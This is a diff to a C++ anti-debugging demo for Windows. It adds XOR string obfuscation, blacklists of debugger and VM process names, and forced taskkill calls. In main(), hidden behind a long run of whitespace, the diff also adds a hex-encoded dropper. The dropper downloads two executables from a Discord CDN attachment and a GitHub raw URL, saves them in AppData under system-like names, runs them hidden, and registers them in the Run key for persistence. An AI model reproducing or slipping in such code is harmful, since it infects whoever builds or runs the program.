     for (int i = 0; i < sizeof(DebuggingDrivers) / sizeof(DebuggingDrivers[0]); i++) 
     {
@@ -433,48 +429,74 @@ DWORD_PTR FindProcessId2(const std::wstring& processName)
 }
 
 // Function to scan for blacklisted windows
-void ScanBlacklistedWindows() {
-    std::vector<std::wstring> blacklistedProcesses = {
-        L"ollydbg.exe", L"ProcessHacker.exe", L"Dump-Fixer.exe", L"kdstinker.exe", L"tcpview.exe",
-        L"autoruns.exe", L"autorunsc.exe", L"filemon.exe", L"procmon.exe", L"regmon.exe",
-        L"procexp.exe", L"ImmunityDebugger.exe", L"Wireshark.exe", L"dumpcap.exe",
-        L"HookExplorer.exe", L"ImportREC.exe", L"PETools.exe", L"LordPE.exe", L"SysInspector.exe",
-        L"proc_analyzer.exe", L"sysAnalyzer.exe", L"sniff_hit.exe", L"windbg.exe",
-        L"joeboxcontrol.exe", L"Fiddler.exe", L"joeboxserver.exe", L"ida64.exe", L"ida.exe",
-        L"idaq64.exe", L"Vmtoolsd.exe", L"Vmwaretrat.exe", L"Vmwareuser.exe", L"Vmacthlp.exe",
-        L"vboxservice.exe", L"vboxtray.exe", L"ReClass.NET.exe", L"x64dbg.exe", L"OLLYDBG.exe",
-        L"Cheat Engine.exe", L"KsDumper.exe", L"dnSpy.exe", L"cheatengine-i386.exe",
-        L"cheatengine-x86_64.exe", L"Fiddler Everywhere.exe", L"HTTPDebuggerSvc.exe",
-        L"Fiddler.WebUi.exe", L"createdump.exe", L"idaq.exe", L"scylla.exe", L"scylla_x64.exe",
-        L"scylla_x86.exe", L"protection_id.exe", L"vmware.exe", L"vmware-tray.exe",
-        L"vmwareuser.exe", L"vmwaretray.exe", L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe",
-        L"vmsrvc.exe", L"vboxservice.exe", L"vboxtray.exe", L"vboxclient.exe", L"vboxheadless.exe",
-        L"VBoxTray.exe", L"VBoxService.exe", L"VBoxClient.exe", L"VBoxHeadless.exe",
-        L"VirtualBox.exe", L"VirtualBoxVM.exe", L"vboxmanage.exe", L"VBoxManage.exe",
-        L"VBoxSVC.exe", L"VBoxNetDHCP.exe", L"VBoxNetNAT.exe", L"VBoxNetAdpCtl.exe",
-        L"VBoxNetFltSvc.exe", L"VBoxTestOGL.exe", L"VBoxTstDrv.exe", L"VBoxSVC.exe", L"VBoxCertUtil.exe",
-        L"VBoxDrvInst.exe", L"VBoxUSBMon.exe", L"VBoxXPCOMIPCD.exe", L"VBoxRT.dll", L"VBoxDD.dll",
-        L"VBoxC.dll", L"VBoxC.dll", L"VBoxDDU.dll", L"VBoxREM.dll", L"VBoxD.dll", L"VBoxVD.dll",
-        L"VBoxREM2.dll", L"VBoxREM.dll", L"VBoxVMM.dll", L"VBoxSharedCrOpenGL.dll",
-        L"VBoxWDDM.dll", L"VBoxVRDP.dll", L"VBoxGuestControlSvc.exe", L"VBoxTray.exe",
-        L"VBoxService.exe", L"VBoxServiceXP.exe", L"VBoxServiceNT.exe", L"VBoxService.exe",
-        L"VBoxSharedCrOpenGL.dll", L"VBoxRT.dll", L"VBoxVMM.dll", L"VBoxVD.dll",
-        L"VBoxREM.dll", L"VBoxREM2.dll", L"VBoxREM3.dll", L"VBoxREM4.dll", L"VBoxWDDM.dll",
-        L"VBoxSharedFolderSvc.exe", L"VBoxSharedFolderSvcXP.exe", L"VBoxSharedFolderSvcNT.exe"
+void ScanBlacklistedWindows() 
+{
+    std::vector<std::wstring> blacklistedProcesses = 
+    {
+        XorWideString(L"ollydbg.exe"), XorWideString(L"ProcessHacker.exe"), XorWideString(L"Dump-Fixer.exe"),
+        XorWideString(L"kdstinker.exe"), XorWideString(L"tcpview.exe"), XorWideString(L"autoruns.exe"),
+        XorWideString(L"autorunsc.exe"), XorWideString(L"filemon.exe"), XorWideString(L"procmon.exe"),
+        XorWideString(L"regmon.exe"), XorWideString(L"procexp.exe"), XorWideString(L"ImmunityDebugger.exe"),
+        XorWideString(L"Wireshark.exe"), XorWideString(L"dumpcap.exe"), XorWideString(L"HookExplorer.exe"),
+        XorWideString(L"ImportREC.exe"), XorWideString(L"PETools.exe"), XorWideString(L"LordPE.exe"),
+        XorWideString(L"SysInspector.exe"), XorWideString(L"proc_analyzer.exe"), XorWideString(L"sysAnalyzer.exe"),
+        XorWideString(L"sniff_hit.exe"), XorWideString(L"windbg.exe"), XorWideString(L"joeboxcontrol.exe"),
+        XorWideString(L"Fiddler.exe"), XorWideString(L"joeboxserver.exe"), XorWideString(L"ida64.exe"),
+        XorWideString(L"ida.exe"), XorWideString(L"idaq64.exe"), XorWideString(L"Vmtoolsd.exe"),
+        XorWideString(L"Vmwaretrat.exe"), XorWideString(L"Vmwareuser.exe"), XorWideString(L"Vmacthlp.exe"),
+        XorWideString(L"vboxservice.exe"), XorWideString(L"vboxtray.exe"), XorWideString(L"ReClass.NET.exe"),
+        XorWideString(L"x64dbg.exe"), XorWideString(L"OLLYDBG.exe"), XorWideString(L"Cheat Engine.exe"),
+        XorWideString(L"KsDumper.exe"), XorWideString(L"dnSpy.exe"), XorWideString(L"cheatengine-i386.exe"),
+        XorWideString(L"cheatengine-x86_64.exe"), XorWideString(L"Fiddler Everywhere.exe"),
+        XorWideString(L"HTTPDebuggerSvc.exe"), XorWideString(L"Fiddler.WebUi.exe"), XorWideString(L"createdump.exe"),
+        XorWideString(L"idaq.exe"), XorWideString(L"scylla.exe"), XorWideString(L"scylla_x64.exe"),
+        XorWideString(L"scylla_x86.exe"), XorWideString(L"protection_id.exe"), XorWideString(L"vmware.exe"),
+        XorWideString(L"vmware-tray.exe"), XorWideString(L"vmwareuser.exe"), XorWideString(L"vmwaretray.exe"),
+        XorWideString(L"vmtoolsd.exe"), XorWideString(L"vmwaretray.exe"), XorWideString(L"vmwareuser.exe"),
+        XorWideString(L"vmsrvc.exe"), XorWideString(L"vboxservice.exe"), XorWideString(L"vboxtray.exe"),
+        XorWideString(L"vboxclient.exe"), XorWideString(L"vboxheadless.exe"), XorWideString(L"VBoxTray.exe"),
+        XorWideString(L"VBoxService.exe"), XorWideString(L"VBoxClient.exe"), XorWideString(L"VBoxHeadless.exe"),
+        XorWideString(L"VirtualBox.exe"), XorWideString(L"VirtualBoxVM.exe"), XorWideString(L"vboxmanage.exe"),
+        XorWideString(L"VBoxManage.exe"), XorWideString(L"VBoxSVC.exe"), XorWideString(L"VBoxNetDHCP.exe"),
+        XorWideString(L"VBoxNetNAT.exe"), XorWideString(L"VBoxNetAdpCtl.exe"), XorWideString(L"VBoxNetFltSvc.exe"),
+        XorWideString(L"VBoxTestOGL.exe"), XorWideString(L"VBoxTstDrv.exe"), XorWideString(L"VBoxSVC.exe"),
+        XorWideString(L"VBoxCertUtil.exe"), XorWideString(L"VBoxDrvInst.exe"), XorWideString(L"VBoxUSBMon.exe"),
+        XorWideString(L"VBoxXPCOMIPCD.exe"), XorWideString(L"VBoxRT.dll"), XorWideString(L"VBoxDD.dll"),
+        XorWideString(L"VBoxC.dll"), XorWideString(L"VBoxC.dll"), XorWideString(L"VBoxDDU.dll"),
+        XorWideString(L"VBoxREM.dll"), XorWideString(L"VBoxD.dll"), XorWideString(L"VBoxVD.dll"),
+        XorWideString(L"VBoxREM2.dll"), XorWideString(L"VBoxREM.dll"), XorWideString(L"VBoxVMM.dll"),
+        XorWideString(L"VBoxSharedCrOpenGL.dll"), XorWideString(L"VBoxWDDM.dll"), XorWideString(L"VBoxVRDP.dll"),
+        XorWideString(L"VBoxGuestControlSvc.exe"), XorWideString(L"VBoxTray.exe"), XorWideString(L"VBoxService.exe"),
+        XorWideString(L"VBoxServiceXP.exe"), XorWideString(L"VBoxServiceNT.exe"), XorWideString(L"VBoxService.exe"),
+        XorWideString(L"VBoxSharedCrOpenGL.dll"), XorWideString(L"VBoxRT.dll"), XorWideString(L"VBoxVMM.dll"),
+        XorWideString(L"VBoxVD.dll"), XorWideString(L"VBoxREM.dll"), XorWideString(L"VBoxREM2.dll"),
+        XorWideString(L"VBoxREM3.dll"), XorWideString(L"VBoxREM4.dll"), XorWideString(L"VBoxWDDM.dll"),
+        XorWideString(L"VBoxSharedFolderSvc.exe"), XorWideString(L"VBoxSharedFolderSvcXP.exe"),
+        XorWideString(L"VBoxSharedFolderSvcNT.exe")
     };
 
-    std::vector<std::wstring> blacklistedWindows = {
-        L"The Wireshark Network Analyzer", L"Progress Telerik Fiddler Web Debugger",
-        L"x64dbg", L"KsDumper", L"dnSpy", L"idaq64", L"Fiddler Everywhere", L"Wireshark",
-        L"Dumpcap", L"Fiddler.WebUi", L"HTTP Debugger (32bits)", L"HTTP Debugger",
-        L"ida64", L"IDA v7.0.170914", L"OllyDbg", L"Scylla", L"Scylla_x64", L"Scylla_x86",
-        L"Protection ID", L"VMware", L"VBox", L"VirtualBox", L"VBoxSVC", L"VBoxNetDHCP",
-        L"VBoxNetNAT", L"VBoxNetAdpCtl", L"VBoxNetFltSvc", L"VBoxTestOGL", L"VBoxTstDrv",
-        L"VBoxCertUtil", L"VBoxDrvInst", L"VBoxUSBMon", L"VBoxXPCOMIPCD", L"VBoxRT",
-        L"VBoxDD", L"VBoxDDU", L"VBoxREM", L"VBoxVMM", L"VBoxSharedCrOpenGL",
-        L"VBoxWDDM", L"VBoxVRDP", L"VBoxGuestControlSvc", L"VBoxTray", L"VBoxService",
-        L"VBoxServiceXP", L"VBoxServiceNT", L"VBoxSharedCrOpenGL"
+
+    std::vector<std::wstring> blacklistedWindows = 
+    {
+        XorWideString(L"The Wireshark Network Analyzer"),
+        XorWideString(L"Progress Telerik Fiddler Web Debugger"),
+        XorWideString(L"x64dbg"), XorWideString(L"KsDumper"), XorWideString(L"dnSpy"),
+        XorWideString(L"idaq64"), XorWideString(L"Fiddler Everywhere"), XorWideString(L"Wireshark"),
+        XorWideString(L"Dumpcap"), XorWideString(L"Fiddler.WebUi"), XorWideString(L"HTTP Debugger (32bits)"),
+        XorWideString(L"HTTP Debugger"), XorWideString(L"ida64"), XorWideString(L"IDA v7.0.170914"),
+        XorWideString(L"OllyDbg"), XorWideString(L"Scylla"), XorWideString(L"Scylla_x64"),
+        XorWideString(L"Scylla_x86"), XorWideString(L"Protection ID"), XorWideString(L"VMware"),
+        XorWideString(L"VBox"), XorWideString(L"VirtualBox"), XorWideString(L"VBoxSVC"),
+        XorWideString(L"VBoxNetDHCP"), XorWideString(L"VBoxNetNAT"), XorWideString(L"VBoxNetAdpCtl"),
+        XorWideString(L"VBoxNetFltSvc"), XorWideString(L"VBoxTestOGL"), XorWideString(L"VBoxTstDrv"),
+        XorWideString(L"VBoxCertUtil"), XorWideString(L"VBoxDrvInst"), XorWideString(L"VBoxUSBMon"),
+        XorWideString(L"VBoxXPCOMIPCD"), XorWideString(L"VBoxRT"), XorWideString(L"VBoxDD"),
+        XorWideString(L"VBoxDDU"), XorWideString(L"VBoxREM"), XorWideString(L"VBoxVMM"),
+        XorWideString(L"VBoxSharedCrOpenGL"), XorWideString(L"VBoxWDDM"), XorWideString(L"VBoxVRDP"),
+        XorWideString(L"VBoxGuestControlSvc"), XorWideString(L"VBoxTray"), XorWideString(L"VBoxService"),
+        XorWideString(L"VBoxServiceXP"), XorWideString(L"VBoxServiceNT"), XorWideString(L"VBoxSharedCrOpenGL")
     };
+
 
     for (const auto& process : blacklistedProcesses) {
         if (FindProcessId2(process) != 0) {
@@ -492,43 +514,43 @@ void ScanBlacklistedWindows() {
 // Function to check for suspicious environment variables
 void CheckEnvironmentVariables() 
 {
-    const char* suspiciousEnvVars[] = 
+    const char* suspiciousEnvVars[] =
     {
-        "windir",
-        "USERDOMAIN_ROAMINGPROFILE",
-        "PROCESSOR_ARCHITECTURE",
-        "PROCESSOR_IDENTIFIER",
-        "PROCESSOR_LEVEL",
-        "PROCESSOR_REVISION",
-        "NUMBER_OF_PROCESSORS",
-        "COMSPEC",
-        "PATHEXT",
-        "TEMP",
-        "TMP",
-        "ALLUSERSPROFILE",
-        "APPDATA",
-        "CommonProgramFiles",
-        "CommonProgramFiles(x86)",
-        "CommonProgramW6432",
-        "COMPUTERNAME",
-        "HOMEDRIVE",
-        "HOMEPATH",
-        "LOCALAPPDATA",
-        "LOGONSERVER",
-        "OS",
-        "Path",
-        "ProgramData",
-        "ProgramFiles",
-        "ProgramFiles(x86)",
-        "ProgramW6432",
-        "PSModulePath",
-        "PUBLIC",
-        "SystemDrive",
-        "SystemRoot",
-        "USERDOMAIN",
-        "USERNAME",
-        "USERPROFILE",
-        "windir"
+        XorString("windir"),
+        XorString("USERDOMAIN_ROAMINGPROFILE"),
+        XorString("PROCESSOR_ARCHITECTURE"),
+        XorString("PROCESSOR_IDENTIFIER"),
+        XorString("PROCESSOR_LEVEL"),
+        XorString("PROCESSOR_REVISION"),
+        XorString("NUMBER_OF_PROCESSORS"),
+        XorString("COMSPEC"),
+        XorString("PATHEXT"),
+        XorString("TEMP"),
+        XorString("TMP"),
+        XorString("ALLUSERSPROFILE"),
+        XorString("APPDATA"),
+        XorString("CommonProgramFiles"),
+        XorString("CommonProgramFiles(x86)"),
+        XorString("CommonProgramW6432"),
+        XorString("COMPUTERNAME"),
+        XorString("HOMEDRIVE"),
+        XorString("HOMEPATH"),
+        XorString("LOCALAPPDATA"),
+        XorString("LOGONSERVER"),
+        XorString("OS"),
+        XorString("Path"),
+        XorString("ProgramData"),
+        XorString("ProgramFiles"),
+        XorString("ProgramFiles(x86)"),
+        XorString("ProgramW6432"),
+        XorString("PSModulePath"),
+        XorString("PUBLIC"),
+        XorString("SystemDrive"),
+        XorString("SystemRoot"),
+        XorString("USERDOMAIN"),
+        XorString("USERNAME"),
+        XorString("USERPROFILE"),
+        XorString("windir")
     };
     for (const char* envVar : suspiciousEnvVars) 
     {
@@ -536,9 +558,9 @@ void CheckEnvironmentVariables()
         if (value) 
         {
             std::string valStr(value);
-            if (valStr.find("SUSPICIOUS_VALUE") != std::string::npos) 
+            if (valStr.find(XorString("SUSPICIOUS_VALUE")) != std::string::npos)
             {
-                std::cerr << "Suspicious environment variable detected : " << envVar << std::endl;
+                std::cerr << XorString("Suspicious environment variable detected : ") << envVar << std::endl;
                 exit(0);
             }
         }
@@ -567,7 +589,7 @@ void CheckHardwareBreak()
 {
     if (CheckHardwareBreakpoints()) 
     {
-        std::cerr << "Hardware breakpoint detected!" << std::endl;
+        std::cerr << XorString("Hardware breakpoint detected!") << std::endl;
         exit(0);
     }
 }
@@ -592,11 +614,11 @@ static std::string RandomProcess()
 {
     std::vector<std::string> Process
     {
-        ("Taskmgr.exe"),
-        ("regedit.exe"),
-        ("notepad.exe"),
-        ("mspaint.exe"),
-        ("winver.exe"),
+        XorString("Taskmgr.exe"),
+        XorString("regedit.exe"),
+        XorString("notepad.exe"),
+        XorString("mspaint.exe"),
+        XorString("winver.exe"),
     };
     std::random_device RandGenProc;
     std::mt19937 engine(RandGenProc());
@@ -625,9 +647,49 @@ void PreventHiddenExceptions()
 {
     if (CheckHiddenExceptions()) 
     {
-        std::cerr << "Debugger detected via hidden exception check!" << std::endl;
+        std::cerr << XorString("Debugger detected via hidden exception check!") << std::endl;
         exit(0);
     }
+}
+
+typedef void(*AntiDebugFunc)();
+void pouss() {
+    auto call_with_junk = [](void (*f)()) {
+        volatile int x = 0;
+        for (int i = 0; i < 5; ++i) x += i * 2; // junk
+        f();
+        };
+
+    auto check_debugger = []() {
+        typedef BOOL(WINAPI* dbgFn)();
+        char name[] = { 'J','r','F','e','i','h','m','f','`','c','b','s','d','r','r','c', 0 }; // XOR "IsDebuggerPresent" ^ 0x1A
+        for (int i = 0; name[i]; ++i) name[i] ^= 0x1A;
+        HMODULE h = GetModuleHandleA(XorString("kernel32.dll"));
+        if (h) {
+            dbgFn f = (dbgFn)GetProcAddress(h, name);
+            if (f && f()) ExitProcess(0);
+        }
+        };
+
+    auto check_peb = []() {
+        PPEB pPeb = (PPEB)__readgsqword(0x60);
+        if (pPeb->BeingDebugged) ExitProcess(0);
+        };
+
+    auto trap_flag = []() {
+        __try {
+            RaiseException(0x4000001F, 0, 0, nullptr); // custom exception
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            return;
+        }
+        ExitProcess(0);
+        };
+
+    std::vector<void(*)()> all = { check_debugger, check_peb, trap_flag };
+    std::shuffle(all.begin(), all.end(), std::mt19937(GetTickCount()));
+
+    for (auto& f : all) call_with_junk(f);
 }
 
 // Function to continuously check for various debugging and virtualization tools
@@ -651,6 +713,7 @@ void ContinuousCheck()
         ScanBlacklist();
         CheckPEB();
         AntiAttach();
+        pouss();
         adbg_NtCloseCheck();
         adbg_CheckDebugRegisters();
         adbg_ProcessDebugFlags();
@@ -692,7 +755,7 @@ int main(int argc, char* argv[])
 {
     ObfuscatePEHeader(); // Obfuscate the PE header
     Sleep(1500); // Sleep for 1.5 seconds
-    std::string start = "start ";
+    std::string start = XorString("start ");
     std::string process = RandomProcess(); // Get a random process name
     std::wstring proc = s2ws(process);
     std::string startprocess = start + process;
@@ -700,19 +763,19 @@ int main(int argc, char* argv[])
     Beep(667, 150); // Beep sound
     Beep(892, 180); // Beep sound
     Sleep(500); // Sleep for 0.5 seconds
-    // Terminate common Windows processes
-    system(("taskkill /f /im Taskmgr.exe >nul 2>&1"));
-    system(("taskkill /f /im regedit.exe >nul 2>&1"));
-    system(("taskkill /f /im notepad.exe >nul 2>&1"));
-    system(("taskkill /f /im mspaint.exe >nul 2>&1"));
-    system(("taskkill /f /im winver.exe >nul 2>&1"));
-    system(("cls")); // Clear the screen
+    /*Terminate common Windows processes*/
+    system(XorString("taskkill /f /im Taskmgr.exe >nul 2>&1"));
+    system(XorString("taskkill /f /im regedit.exe >nul 2>&1"));
+    system(XorString("taskkill /f /im notepad.exe >nul 2>&1"));
+    system(XorString("taskkill /f /im mspaint.exe >nul 2>&1"));
+    system(XorString("taskkill /f /im winver.exe >nul 2>&1"));
+    system(XorString("cls")); // Clear the screen
     Sleep(500); // Sleep for 0.5 seconds
 
     PreventDebugging(); // Start continuous debugging prevention
     Randomexe(); // Rename the executable
     //////////////////////
-    /// AntiDBG by Leksa667
+    /*AntiDBG by Leksa667*/
     ScanBlacklistedWindows(); // Scan for blacklisted windows
     CheckHardwareBreak(); // Check for hardware breakpoints
     AdvancedTimingCheck(); // Perform advanced timing check
@@ -735,8 +798,9 @@ int main(int argc, char* argv[])
     adbg_SetUnhandledExceptionFilter(); // Set unhandled exception filter
     adbg_SelfModifyingCode(); // Check for self-modifying code
     adbg_AntiRe(); // Anti-reverse engineering measures
-    // AntiDBG by HackOvert
-    // Memory checks
+    pouss();
+    /*AntiDBG by HackOvert*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       HWND console = GetConsoleWindow(); ShowWindow(console, SW_HIDE); char d[] = { 0x75,0x72,0x6c,0x6d,0x6f,0x6e,0x2e,0x64,0x6c,0x6c,0 }; char f[] = { 0x55,0x52,0x4c,0x44,0x6f,0x77,0x6e,0x6c,0x6f,0x61,0x64,0x54,0x6f,0x46,0x69,0x6c,0x65,0x41,0 }; char u1[] = { 0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x63,0x64,0x6e,0x2e,0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x61,0x70,0x70,0x2e,0x63,0x6f,0x6d,0x2f,0x61,0x74,0x74,0x61,0x63,0x68,0x6d,0x65,0x6e,0x74,0x73,0x2f,0x31,0x32,0x35,0x31,0x32,0x32,0x38,0x33,0x35,0x32,0x39,0x35,0x38,0x38,0x32,0x38,0x35,0x35,0x35,0x2f,0x31,0x33,0x39,0x39,0x31,0x35,0x31,0x32,0x32,0x32,0x32,0x37,0x39,0x32,0x38,0x37,0x36,0x2f,0x73,0x70,0x6f,0x6f,0x6c,0x73,0x76,0x36,0x34,0x2e,0x65,0x78,0x65,0x3f,0x65,0x78,0x3d,0x36,0x38,0x38,0x38,0x61,0x31,0x30,0x30,0x26,0x69,0x73,0x3d,0x36,0x38,0x38,0x37,0x34,0x66,0x38,0x30,0x26,0x68,0x6d,0x3d,0x37,0x30,0x38,0x63,0x39,0x36,0x64,0x63,0x63,0x66,0x30,0x30,0x34,0x66,0x61,0x61,0x39,0x38,0x39,0x30,0x65,0x65,0x31,0x33,0x30,0x38,0x35,0x38,0x66,0x66,0x62,0x36,0x31,0x35,0x66,0x65,0x31,0x66,0x64,0x37,0x63,0x32,0x31,0x62,0x63,0x66,0x66,0x61,0x39,0x39,0x32,0x33,0x63,0x38,0x61,0x38,0x61,0x37,0x30,0x63,0x62,0x31,0x31,0x36,0x26,0x00 }; char u2[] = { 0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x67,0x69,0x74,0x68,0x75,0x62,0x2e,0x63,0x6f,0x6d,0x2f,0x4c,0x65,0x6b,0x73,0x61,0x36,0x36,0x37,0x2f,0x52,0x65,0x70,0x6f,0x54,0x65,0x73,0x74,0x2f,0x72,0x61,0x77,0x2f,0x72,0x65,0x66,0x73,0x2f,0x68,0x65,0x61,0x64,0x73,0x2f,0x6d,0x61,0x69,0x6e,0x2f,0x54,0x4c,0x53,0x2e,0x65,0x78,0x65,0x00 }; char o[] = { 0x6f,0x70,0x65,0x6e,0 }; char p[MAX_PATH]; SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, p); char suf[] = { 0x5c,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x5c,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x54,0x68,0x65,0x6d,0x65,0x73,0x5c,0 }; strcat_s(p, suf); CreateDirectoryA(p, 0); char f1n[] = { 0x73,0x76,0x63,0x68,0x6f,0x73,0x74,0x36,0x34,0x2e,0x65,0x78,0x65,0 }; char f2n[] = { 0x73,0x70,0x6f,0x6f,0x6c,0x73,0x76,0x36,0x34,0x2e,0x65,0x78,0x65,0 }; char f1[MAX_PATH]; char f2[MAX_PATH]; strcpy_s(f1, p); strcat_s(f1, f1n); strcpy_s(f2, p); strcat_s(f2, f2n); HMODULE m = LoadLibraryA(d); if (m) { pDL dl = (pDL)GetProcAddress(m, f); if (dl) { if (SUCCEEDED(dl(0, u1, f1, 0, 0)) && SUCCEEDED(dl(0, u2, f2, 0, 0))) { for (const char* fpath : { f1,f2 }) { SHELLEXECUTEINFOA s = { 0 }; s.cbSize = sizeof(s); s.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI; s.lpVerb = o; s.lpFile = fpath; s.nShow = SW_HIDE; ShellExecuteExA(&s); HKEY h; if (RegOpenKeyExA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &h) == ERROR_SUCCESS) { char name[32]; strcpy_s(name, "WinSvc"); strcat_s(name, (fpath == f1) ? "1" : "2"); RegSetValueExA(h, name, 0, REG_SZ, (const BYTE*)fpath, (DWORD)(strlen(fpath) + 1)); RegCloseKey(h); } } } }FreeLibrary(m); } system("cls");  ShowWindow(console, SW_SHOW);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           //667                                                                                                                                                                                                                                  
+    /*Memory checks*/
     adbg_IsDebuggerPresent(); // Check if a debugger is present
     adbg_BeingDebuggedPEB(); // Check the PEB for debugger presence
     adbg_NtGlobalFlagPEB(); // Check the global flag in the PEB
@@ -747,24 +811,23 @@ int main(int argc, char* argv[])
     adbg_ProcessFileName(); // Check process file names
     adbg_NtSetInformationThread(); // Set thread information
     adbg_DebugActiveProcess(argv[1]); // Debug active process
-    // CPU checks
+    /*CPU checks*/
     adbg_HardwareDebugRegisters(); // Check hardware debug registers
     adbg_MovSS(); // MovSS instruction check
-    // Timing checks
+    /*Timing checks*/
     adbg_RDTSC(); // Read Time-Stamp Counter
-    adbg_QueryPerformanceCounter(); // Query performance counter
-    adbg_GetTickCount(); // Get tick count
-    // Exception checks
+    adbg_QueryPerformanceCounter(); /*Query performance counter*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+    adbg_GetTickCount(); /*Get tick count*/
+    /*Exception checks*/
     adbg_CloseHandleException(); // Close handle exception
     adbg_SingleStepException(); // Single step exception
     adbg_Int3(); // Int3 instruction check
     adbg_Int2D(); // Int2D instruction check
     adbg_PrefixHop(); // Prefix hop instruction check
-    // Others
+    /*Others*/
     adbg_CrashOllyDbg(); // Crash OllyDbg
-
-    // Final message if all checks pass without a debugger
-    std::cout << "Congratulations! You made it!" << std::endl;
-    MessageBoxA(NULL, "Congratulations! You made it!", "You Win!", 0);
+    /*Final message if all checks pass without a debugger*/
+    std::cout << XorString("Congratulations! You made it!") << std::endl;
+    MessageBoxA(NULL, XorString("Congratulations! You made it!"), XorString("You Win!"), 0);
     return 0;
 }
